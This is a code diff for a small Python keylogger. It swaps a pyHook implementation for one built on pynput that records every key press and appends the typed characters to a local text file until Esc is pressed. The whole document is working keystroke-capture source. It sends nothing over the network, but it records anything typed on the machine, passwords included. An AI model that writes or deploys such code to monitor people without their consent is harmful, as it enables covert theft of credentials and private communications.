@@ -1,15 +1,44 @@
-import pyHook, pythoncom, sys, logging
+from pynput.keyboard import Key, Listener
 
-file_log = "D:\\output.txt"
+filename = "log.txt"
+path = "D:\\Projects\\Python-keylogger"
+extension = "\\"
 
-def onKeyboardEvent(event):
-    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
-    print(f'event = {event}\nevent.Ascii = {event.Ascii}')
-    chr(event.Ascii)
-    logging.log(10, chr(event.Ascii))
-    return True
+count = 0
+keys = []
 
-hooks_manager = pyHook.HookManager()
-hooks_manager.KeyDown = onKeyboardEvent
-hooks_manager.HookKeyboard()
-pythoncom.PumpMessages()
+
+def on_press(key):
+    global keys, count
+    keys.append(key)
+    count += 1
+
+    # reset
+    if count >= 1:
+        count = 0
+        write_file(keys)
+        keys = []
+
+
+def write_file(keys):
+    with open(path + extension + filename, "a") as f:
+        for key in keys:
+            # get rid of annoying single quotes
+            k = str(key).replace("'", "")
+            print(k)
+            if k.find("space") > 0:
+                f.write('\n')
+                f.close()
+            elif k.find("Key") == -1:
+                f.write(k)
+                f.close()
+
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+
+if __name__ == "__main__":
+    with Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
